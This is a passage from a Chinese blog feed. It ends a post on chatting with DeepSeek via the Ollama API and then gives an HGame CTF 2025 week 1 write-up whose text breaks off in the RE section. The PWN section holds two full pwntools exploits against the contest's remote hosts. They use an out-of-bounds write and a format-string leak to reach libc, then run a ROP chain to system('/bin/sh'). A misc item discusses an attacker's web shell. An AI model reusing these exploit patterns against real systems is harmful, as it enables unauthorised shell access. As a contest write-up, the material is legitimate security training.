class="subst">&#123;message[<span class="string">&#x27;content&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------------------------------------\n&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_messages</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;##ds##: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    assistant_reply = <span class="string">&quot;&quot;</span>  <span class="comment"># 收集各个chunk的回复</span></span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(chunk.choices[<span class="number">0</span>].delta.content, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        assistant_reply += chunk.choices[<span class="number">0</span>].delta.content</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">return</span> assistant_reply</span><br><span class="line"></span><br><span class="line">messages = [&#123;</span><br><span class="line">    <span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, </span><br><span class="line">    <span class="string">&quot;content&quot;</span>: <span class="string">&quot;你需严格跟踪对话历史（位于[系统消息]之后），始终保持对话连贯性。响应时需主动关联先前讨论内容。&quot;</span></span><br><span class="line">&#125;]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    user_input = <span class="built_in">input</span>(<span class="string">&quot;##user##: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user_input.lower() == <span class="string">&quot;q&quot;</span>: <span class="comment"># 按q退出</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> user_input.lower() == <span class="string">&quot;h&quot;</span>: <span class="comment"># 按h打印对话记录</span></span><br><span class="line">        print_history(messages)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    messages.append(&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: user_input&#125;)</span><br><span class="line"></span><br><span class="line">    response = client.chat.completions.create(  <span class="comment"># 生成对话</span></span><br><span class="line">        model=<span class="string">&quot;deepseek-v3:latest&quot;</span>,</span><br><span class="line">        messages=messages,</span><br><span class="line">        stream=<span class="literal">True</span>     <span class="comment"># 流式对话</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    assistant_reply = print_messages(response) <span class="comment"># 打印对话</span></span><br><span class="line">    messages.append(&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;assistant&quot;</span>, <span class="string">&quot;content&quot;</span>: assistant_reply&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/assets/post_img/dev/Ollama_API_&amp;_DeepSeek_API_%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8/test.png" alt="image-20250217222357183"></p><p>实际上，上下文效果并不好，可能需要更严格的设定，但目前也勉强算有上下文衔接了</p>]]></content>
      
      
      <categories>
          
          <category> Dev </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGame CTF 2025 week1 wp</title>
      <link href="/posts/4338f95.html"/>
      <url>/posts/4338f95.html</url>
      
        <content type="html"><![CDATA[<p><strong>队伍名称</strong>：顾白</p><p><strong>队伍ID</strong>：0002e1</p><p><strong>成绩</strong>：33</p><p>week1基本每个方向都差一道，week1结束时是十来名，week2没有精力做了</p><h2 id="签到">签到</h2><h3 id="TEST-NC">&gt; TEST NC</h3><p>nc到靶机即可</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/test_nc.png" alt="image-20250206164514995"></p><h3 id="从这里开始的序章。">&gt; 从这里开始的序章。</h3><p><img src="/assets/post_img/ctf/HGameCTF2025week1/qiandao.png" alt="image-20250206170849792"></p><h2 id="CRYPTO">CRYPTO</h2><h3 id="ezBag">&gt; ezBag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> MixedIntegerLinearProgram, vector</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知数据</span></span><br><span class="line">list_data = [</span><br><span class="line">    [<span class="number">2826962231</span>, <span class="number">3385780583</span>, <span class="number">3492076631</span>, ...],  <span class="comment"># 省略</span></span><br><span class="line">    [<span class="number">2241199309</span>, <span class="number">3658417261</span>, <span class="number">3032816659</span>, ...],</span><br><span class="line">    [<span class="number">4263404657</span>, <span class="number">3176466407</span>, <span class="number">3364259291</span>, ...],</span><br><span class="line">    [<span class="number">2844773681</span>, <span class="number">3852689429</span>, <span class="number">4187117513</span>, ...]</span><br><span class="line">]</span><br><span class="line">bag = [<span class="number">123342809734</span>, <span class="number">118191282440</span>, <span class="number">119799979406</span>, <span class="number">128273451872</span>]</span><br><span class="line">ciphertext = <span class="string">b&#x27;\x1d6\xcc&#125;\x07\xfa7G\xbd\x01\xf0P4^Q&quot;\x85\x9f\xac\x98\x8f#\xb2\x12\xf4+\x05`\x80\x1a\xfa !\x9b\xa5\xc7g\xa8b\x89\x93\x1e\xedz\xd2M;\xa2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建整数线性规划模型</span></span><br><span class="line">mip = MixedIntegerLinearProgram(maximization=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 定义 64 个二进制变量 x[0..63]，代表 p 的各二进制位</span></span><br><span class="line">x = mip.new_variable(binary=<span class="literal">True</span>, indices=<span class="built_in">range</span>(<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对应四组背包和约束：sum_&#123;j=0..63&#125; x_j * list_data[i][j] = bag[i]</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    mip.add_constraint(</span><br><span class="line">        <span class="built_in">sum</span>(x[j] * list_data[i][j] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)) == bag[i]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始求解</span></span><br><span class="line">mip.solve()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取解并还原 p</span></span><br><span class="line">solution_bits = [<span class="built_in">int</span>(<span class="built_in">round</span>(mip.get_values(x[j]))) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line">p = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">64</span>)):</span><br><span class="line">    p = (p &lt;&lt; <span class="number">1</span>) | solution_bits[j]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用 p 的字符串形式做 key</span></span><br><span class="line">key = hashlib.sha256(<span class="built_in">str</span>(p).encode()).digest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># AES ECB 解密</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">plaintext = cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure><h3 id="sieve">&gt; sieve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = e^<span class="number">2</span>//<span class="number">6</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sum_totients_with_progress</span>(<span class="params">n</span>):</span><br><span class="line">    phi = <span class="built_in">list</span>(<span class="built_in">range</span>(n + <span class="number">1</span>))  <span class="comment"># 初始化 phi[i] = i</span></span><br><span class="line">    phi_sum = [<span class="number">0</span>] * (n + <span class="number">1</span>)   <span class="comment"># 存储前缀和</span></span><br><span class="line">    primes = []</span><br><span class="line">    is_prime = [<span class="literal">True</span>] * (n + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用 tqdm 添加进度条</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">2</span>, n + <span class="number">1</span>), desc=<span class="string">&quot;Calculating Totients&quot;</span>):</span><br><span class="line">        <span class="keyword">if</span> is_prime[i]:  <span class="comment"># i 是质数</span></span><br><span class="line">            primes.append(i)</span><br><span class="line">            phi[i] = i - <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 用所有之前找到的质数来筛选 i 的倍数</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> primes:</span><br><span class="line">            <span class="keyword">if</span> i * p &gt; n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            is_prime[i * p] = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> i % p == <span class="number">0</span>:  <span class="comment"># p 是 i 的因子</span></span><br><span class="line">                phi[i * p] = phi[i] * p</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                phi[i * p] = phi[i] * (p - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算前缀和</span></span><br><span class="line">        phi_sum[i] = phi_sum[i - <span class="number">1</span>] + phi[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phi_sum[n]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行示例</span></span><br><span class="line">n = <span class="number">715849728</span>  <span class="comment"># 计算 2 到 10^6 之间的欧拉函数和，并显示进度</span></span><br><span class="line">result = sum_totients_with_progress(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Sum of totients from 2 to <span class="subst">&#123;n&#125;</span>: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> primepi</span><br><span class="line"></span><br><span class="line">n = <span class="number">715849728</span></span><br><span class="line">count = primepi(n)</span><br><span class="line"><span class="built_in">print</span>(count)</span><br><span class="line">p = q = nextprime((result+count+<span class="number">1</span>)&lt;&lt;<span class="number">128</span>)</span><br><span class="line"><span class="comment"># print(155763335410704471+37030583+1)</span></span><br><span class="line"><span class="comment"># print(nextprime(155763335447735055&lt;&lt;128))</span></span><br><span class="line">p = q = <span class="number">53003516465655400667707442798277521907437914663503790163</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*q</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(enc,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="MISC">MISC</h2><h3 id="Hakuya-Want-A-Girl-Friend">&gt; Hakuya Want A Girl Friend</h3><p>附件为文件的16进制原始数据，导出为，是一个压缩包，但是需要密码</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/zip.png" alt="image-20250206164841289"></p><p>010打开查看，最后发现 <code>GNP</code> ，猜测十六进制逆序可以看到png图片</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/gnp.png" alt="image-20250206165658236"></p><p>使用工具 <a href="https://github.com/AabyssZG/FileReverse-Tools">FileReverse-Tools</a> 对文件反转，并重命名 .png</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/image.png" alt="image-20250206165416523"></p><p>爆破宽高得到解压密码 <code>To_f1nd_th3_QQ</code></p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/password.png" alt="image-20250206165522148"></p><p>解压得到flag(需调整格式)</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/misc1flag.png" alt="image-20250206165753599"></p><h3 id="Level-314-线性走廊中的双生实体">&gt; Level 314 线性走廊中的双生实体</h3><p>下载模型文件，查看安全层代码</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/secuerLayer.png" alt="image-20250206170222108"></p><p>尝试传入张量来满足条件，但总是失败，于是将 <code>_0</code> 改为 <code>True</code>，重新打包模型，传入任意张量得到flag</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/misc2flag.png" alt="image-20250206170659586"></p><h3 id="Computer-cleaner">&gt; Computer cleaner</h3><p>根据提示，查看上传的 <code>shell.php</code>，查到 flag_part1 <code>hgame&#123;y0u_</code></p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/flag_part1.png" alt="image-20250206171504942"></p><p>查看上传日志</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/log.png" alt="image-20250206171654769"></p><p>猜测 <code>121.41.34.25</code> 为攻击者ip，浏览器访问该ip得到 flag_part2 <code>hav3_cleaned_th3</code></p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/flag_part2.png" alt="image-20250206171751994"></p><p>日志最后一条记录攻击者查询了 <code>~/Documents/flag_part3</code>，查看此文件得到 flag_part3 <code>_c0mput3r!&#125;</code></p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/flag_part3.png" alt="image-20250206171929050"></p><p>拼接，hgame{y0u_hav3_cleaned_th3_c0mput3r!}</p><h2 id="PWN">PWN</h2><h3 id="counting-petals">&gt; counting petals</h3><p>数组越位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node2.hgame.vidar.club&#x27;</span>, <span class="string">&#x27;31149&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;./vuln&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *$rebase(0x13c8)&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;How many flowers have you prepared this time?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;the flower number &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;the flower number &#x27;</span>)</span><br><span class="line"></span><br><span class="line">t=<span class="number">0x7ffffffc00000014</span>-<span class="number">0x8000000000000000</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(t).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>+<span class="number">15</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;the flower number &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t=<span class="number">0x2000000020</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;the flower number &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(t).encode())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Reply 1 indicates the former and 2 indicates the latter: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Let\&#x27;s look at the results.\n&#x27;</span>)</span><br><span class="line">enc=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,p.recvline()[:-<span class="number">3</span>].decode().replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;+&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"></span><br><span class="line">libc_start_main=enc[<span class="number">18</span>]-<span class="number">128</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">libc_base = libc_start_main-<span class="number">0x29d10</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;How many flowers have you prepared this time?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;the flower number &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t=<span class="number">0x1200000016</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;the flower number &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(t).encode())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;the flower number &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc_base+<span class="number">0x29139</span>).encode())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;the flower number &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc_base+<span class="number">0x2a3e5</span>).encode())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;the flower number &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(binsh).encode())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;the flower number &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(system).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Reply 1 indicates the former and 2 indicates the latter: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="format">&gt; format</h3><p>格式化字符串泄露buf地址，-1溢出后跳回printf(buf)泄露libc信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">bss = <span class="number">0x404050</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node1.hgame.vidar.club&#x27;</span>,<span class="number">30506</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x4011CC&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;n = &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;type something:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%p&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">buf = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;y&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)+<span class="number">0x2138</span>+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&#x27;buf: <span class="subst">&#123;<span class="built_in">hex</span>(buf)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;n = &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(b&#x27;type something:&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span>+p64(buf-<span class="number">0x18</span>)+p64(<span class="number">0x4012CF</span>)+<span class="string">b&#x27;%3$p&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">read_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\xff&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)-<span class="number">18</span></span><br><span class="line">log.success(<span class="string">f&#x27;read_addr: <span class="subst">&#123;<span class="built_in">hex</span>(read_addr)&#125;</span>&#x27;</span>)</span><br><span class="line">libc_base = read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&#x27;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi = libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">log.success(<span class="string">f&#x27;rdi: <span class="subst">&#123;<span class="built_in">hex</span>(rdi)&#125;</span>&#x27;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&#x27;system: <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&#x27;</span>)</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&#x27;binsh: <span class="subst">&#123;<span class="built_in">hex</span>(binsh)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(buf-<span class="number">0x18</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="RE">RE</h2><h3 id="Compress-dot-new">&gt; Compress dot new</h3><p>霍夫曼编码解压缩</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_decoder_tree</span>(<span class="params">huffman_tree</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_tree</span>(<span class="params">node</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> node:</span><br><span class="line">            <span class="keyword">return</span> node[<span class="string">&#x27;s&#x27;</span>]</span><br><span class="line">        left = parse_tree(node[<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line">        right = parse_tree(node[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;0&#x27;</span>: left, <span class="string">&#x27;1&#x27;</span>: right&#125;</span><br><span class="line">    